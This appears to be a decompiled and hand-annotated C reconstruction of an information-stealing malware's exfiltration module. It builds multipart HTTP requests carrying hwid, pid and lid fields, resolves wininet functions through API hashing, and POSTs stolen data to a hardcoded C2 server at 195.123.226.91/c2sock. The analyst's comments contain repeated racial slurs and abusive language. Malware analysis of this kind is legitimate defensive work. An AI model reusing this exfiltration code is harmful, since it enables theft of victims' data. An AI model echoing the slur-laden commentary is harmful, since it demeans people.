#include "../HEADER/HEADER.c"

size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_t *_bffSize)
{   // nigga wtf this func is just doing the most basic thing—stuffing a multipart/form-data request with random junk, 
    // probably some HWID or other useless identifier like it some genius move.
    // It's basically taking a wide string, making it look like it does something cool, then throwing it in the header
    // Then it slaps random file data to the body like this is some fancy attack nah its just sending ur info to the C2
    
    int unused1;
    int _p_SysInfoOffset;
    CHAR *ShitiStr;
    size_t bffSize;
    unsigned int currentPosition;
    size_t resultSize;
    _p_SysInfoOffset = unused1;
    currentPosition = *_bffSize;

    ShitiStr = ProccessingOrMapsTheWideCharacter(&globalData); // same fcking globalData btw
    bffSize = *_bffSize;
    *(_WORD *)(*_bffSize + _p_SysInfoOffset) = 11565;
    memmove((void *)(bffSize + _p_SysInfoOffset + 2), ShitiStr, strlen(ShitiStr));
    currentPosition = strlen(ShitiStr) + bffSize + 2;

    // build a multipart form request
    qmemcpy((void *)(currentPosition + _p_SysInfoOffset), "\r\nContent-Disposition: form-data; name=\"file", 44);
    qmemcpy((void *)(currentPosition + _p_SysInfoOffset + 44), "\"; filename=\"", 13);
    
    // identifier or special value : 1701603686
    *(_DWORD *)(currentPosition + _p_SysInfoOffset + 57) = 1701603686;
    *(_WORD *)(currentPosition + _p_SysInfoOffset + 61) = 3362;
    *(_BYTE *)(currentPosition + _p_SysInfoOffset + 63) = 10;
    qmemcpy((void *)(currentPosition + _p_SysInfoOffset + 64), "Content-Type: attachment/x-object\r\n\r\n", 0x25u);
    memmove((void *)(currentPosition + _p_SysInfoOffset + 101), dataToSend, dataSize);
    *(_WORD *)(currentPosition + dataSize + _p_SysInfoOffset + 101) = 2573;
    resultSize = currentPosition + dataSize + 103;
    *_bffSize = resultSize;

    return resultSize;
}

int __cdecl 
WinnetDllFuncRelatedExfiltrationRoutineetc(const char *header_p_SysInfo, 
                                           int extraParam, 
                                           int dataSize, 
                                           PSTR IPaddrs)
{ /*
    WinnetDllFuncRelated:
    =====================
    - well well well, again and again classic skid niggi level data theft using wininet, straight out of 2010 malware playbooks
    - connects to 195.123.226.91 and dumps stolen system data via POST /c2sock  
    - API calls are hashed, but any RE with 5 minutes of IDA time can resolve them nice try niggi
    - No TLS, no encryption, just raw exfiltration over HTTP like its a school project (im just kidding niggers)  
    - lol, edrs or even a basic MITM packet capture would expose this in seconds
    - If that skiddi sucker stealer was advanced stealer to the dev, they should rethink their life choices
 */
    int sessionHandle;
    int connectionHandle;
    int (__stdcall *InternetOpenA_Func)(const char *, _DWORD, _DWORD, _DWORD, _DWORD);
    int requestHandle;
    int (__stdcall *InternetConnectA_Func)(int, int, int, _DWORD, _DWORD, int, _DWORD, int);
    int sendRequestHandle;
    int (__stdcall *HttpOpenRequestA_Func)(int, const char *, const char *, _DWORD, _DWORD, _DWORD, _DWORD, int);
    int (__stdcall *HttpSendRequestA_Func)(int, const char *, unsigned int, int, int);
    int (__stdcall *InternetCloseHandle_Func)(int);
    unsigned int headersLenght;

    InternetOpenA_Func = (int (__stdcall *)(const char *, _DWORD, _DWORD, _DWORD, _DWORD))ResolveTheHash(
        -1221180948, (int)L"wininet.dll");
    sessionHandle = InternetOpenA_Func("HTTP/1.1", 0, 0, 0, 0);

    InternetConnectA_Func = (int (__stdcall *)(int, int, int, _DWORD, _DWORD, int, _DWORD, int))ResolveTheHash(
        2024816598, (int)L"wininet.dll");
    connectionHandle = InternetConnectA_Func(sessionHandle, IPaddrs, 80, 0, 0, 3, 0, 1);

    /*
    int32_t esi_2 = ResolveHashes(2073911457, Param_1)(InternetConnectA_Func(sessionHandle, "195.123.226.91", 80, ebx, ebx, 3, ebx, 1), "POST", "/c2sock", 0, 0, 0, 0, 1); // ebx == 0
    */
    
    HttpOpenRequestA_Func = (int (__stdcall *)(int, const char *, const char *, _DWORD, _DWORD, _DWORD, _DWORD, int))ResolveTheHash(
        2073911457, (int)L"wininet.dll");
    requestHandle = HttpOpenRequestA_Func(connectionHandle, "POST", "/c2sock", 0, 0, 0, 0, 1);

    headersLenght = strlen(header_p_SysInfo);
    HttpSendRequestA_Func = (int (__stdcall *)(int, const char *, unsigned int, int, int))ResolveTheHash(
        -1388942586, (int)L"wininet.dll");
    HttpSendRequestA_Func(requestHandle, header_p_SysInfo, headersLenght, extraParam, dataSize);

    InternetCloseHandle_Func = (int (__stdcall *)(int))ResolveTheHash(1607704873, (int)L"wininet.dll");
    InternetCloseHandle_Func(sessionHandle);
    InternetCloseHandle_Func(connectionHandle);
    return InternetCloseHandle_Func(requestHandle);
}
// ----------------------------------
// ----------------------------------
int __fastcall AddRequestParameter(int request_p_SysInfoOffset, const void *parameterName, void *parameterValue, int *_bffSize)
{   // here we go again another dumb attempt at appending data to some HTTP request
    // like its doing some genius encryption or compression but nah, its just spitting random strings and values into headers
    // It grabs the wch string (probably some ID or key) slaps it in the request, then chucks the rest of the random junk bam skibiddi skibiddi hawk twah hawk

    CHAR *wideStrProcessed; int currentOffset; unsigned int finalOffset; unsigned int tempSize;
    int result; unsigned int processedLength;

    wideStrProcessed = ProccessingOrMapsTheWideCharacter(&globalData);
    currentOffset = *_bffSize;
    *(_WORD *)(*_bffSize + request_p_SysInfoOffset) = 11565;
    memmove((void *)(request_p_SysInfoOffset + currentOffset + 2), wideStrProcessed, strlen(wideStrProcessed));
    processedLength = strlen(wideStrProcessed) + *_bffSize + 2;
    qmemcpy((void *)(processedLength + request_p_SysInfoOffset), "\r\nContent-Disposition: form-data; name=\"", 40u);
    memmove((void *)(processedLength + request_p_SysInfoOffset + 40), parameterName, strlen((const char *)parameterName));
    finalOffset = processedLength + 40 + strlen((const char *)parameterName);
    *(_DWORD *)(finalOffset + request_p_SysInfoOffset) = 218762530;
    *(_BYTE *)(finalOffset + request_p_SysInfoOffset + 4) = 10;
    memmove((void *)(finalOffset + request_p_SysInfoOffset + 5), parameterValue, strlen((const char *)parameterValue));
    tempSize = strlen((const char *)parameterValue);
    *(_WORD *)(finalOffset + tempSize + request_p_SysInfoOffset + 5) = 2573; 
    result = finalOffset + tempSize + 7;
    *_bffSize = result;
    return result;
}

int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
{
    uint32_t sessionID = (uint32_t)SysInfo[1];
    int32_t* p_SysInfo = *(uint32_t*)SysInfo;
    char* sessionStr = Alloc();
    __ltoa(sessionID, sessionStr, 10);
    void* _p_SysInfo = nullptr;
    // void* temp_p_SysInfo = nullptr;
    Block = 0;
    int ProcessedUserID;
    char *ShortSessionToken;
    if (p_SysInfo)
    {
        CleanupData(p_SysInfo);
        ProcessData((unsigned int *)p_SysInfo);
        _p_SysInfo = *(uint32_t*)p_SysInfo;
        // void* tempStorage = _p_SysInfo;
        // int32_t flag = 1;
        void* Block = malloc(1u, *p_SysInfo);
        // temp_p_SysInfo = Block;
        memmove(Block, *(uint32_t*)(p_SysInfo[18] + 72), _p_SysInfo);
        HandleProcessing(p_SysInfo, 1);
        FinalizeData(p_SysInfo, 1);
        _free(p_SysInfo);
    } 
    ProcessedUserID = *((unsigned __int16 *)SysInfo + 2);
    
    char* header_p_SysInfo = (char *)malloc(2048);
    void* DATA = malloc(_p_SysInfo + 4096);
    PSTR formattedData = ProccessingOrMapsTheWideCharacter(&globalData);
    // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.  
    // they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
    // The dev’s probably thinking theyre soo slick, but theyre just out here grabbing basic stuff like HWID, PID, lid, and sending it to a server. This is barely even hacking. It's scraping system info, tossing it into a server request, and calling it "data exfiltration" How original.  
    // They even throw in an IP address "195.123.226.91" what a genius (lol). Grabbing an IP like it’s something special. Like no ones ever done that before.  
    // lol, i cant reverse lazy data-stealing tool, thats enough cobbled together by some skiddie dev who probably thinks theyre reinventing the wheel. just taking stuff that's already there and sending it out in the most basic, amateur way possible


    strcpy(header_p_SysInfo, "Content-Type: multipart/form-data; boundary=");
    memmove(header_p_SysInfo + 44, formattedData, strlen(formattedData));

    header_p_SysInfo[strlen(formattedData) + 44] = 0;
    
    char* requestID;
    requestID = GenerateRequestID();
    ShortSessionToken = (char *)malloc(5u);
    ProcessUserOrSystemData(ProcessedUserID, ShortSessionToken, 10);
    PrcssingMultipartRequest(Block, _p_SysInfo, (size_t *)&ProcessedUserID);
    AddRequestParameter((int)DATA, "hwid", RequestID, (unsigned int *)&ProcessedUserID);
    AddRequestParameter((int)DATA, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID);
    AddRequestParameter((int)DATA, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID);
    
    PSTR ip195 = ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
    WinnetDllFuncRelatedExfiltrationRoutineetc(header_p_SysInfo, (int)DATA, DataSizeCounter, ip195);
    
    return _free(Block);
}
